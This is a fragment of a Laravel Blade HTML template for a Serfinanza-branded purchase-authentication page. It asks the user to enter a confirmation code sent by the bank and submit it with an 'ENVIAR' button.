...
<head>
    ...
    <link rel="stylesheet" href="{{asset('assets/css/payment/serfinanza.css')}}">
...
<body>
 <div id="formContainer" class="details" style="padding:6px;">
        <img src="{{asset('assets/img/payment/serfinanza/serfinanzalogo.png')}}" alt="" srcset="" width="120px">
    <hr>
    <a style="color:black;">Autenticación de compra</a><p></p>
    <br><a style="color:black;">Serfinanza le envío un código de confirmación para continuar con el proceso de compra. Por favor digítelo.</a><p></p>
        ...
        <center>
            ...
            <br>
            <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:60%;">
        </center>
        <p></p>
        <p>
            <br>
